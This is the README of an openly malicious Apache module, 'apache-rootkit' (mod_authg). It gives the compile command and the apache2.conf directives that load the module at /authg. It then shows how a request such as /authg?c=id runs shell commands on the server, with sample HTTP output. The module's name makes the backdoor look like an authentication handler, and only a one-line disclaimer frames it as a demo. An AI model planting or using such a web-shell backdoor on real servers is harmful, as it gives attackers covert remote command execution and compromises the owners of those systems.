# apache-rootkit
A malicious Apache module with rootkit functionality
C. Papathanasiou 2015

 Compile by running:
```
   $ apxs -c -i mod_authg.c
```
 Then activate it in Apache's apache2.conf file for instance
 for the URL /authg in as follows:
```
    #   apache2.conf
    LoadModule authg_module modules/mod_authg.so
    <Location /authg>
    SetHandler authg
   </Location>
```
  Then after restarting Apache via
```
    $ apachectl restart
```
  you immediately can request the URL /authg?c=cmd and watch for the
  output of this module. This can be achieved for instance via:
```
    $ lynx -mime_header http://localhost/authg?c=id 
```
  The output should be similar to the following one:
```
     HTTP/1.1 200 OK
     Date: Thu, 19 Feb 2015 16:33:30 GMT
     Server: Apache/2.4.7 (Ubuntu)
     Content-Length: 54
     Connection: close
     Content-Type: text/html

     uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Created for demo purposes only, no liability accepted.
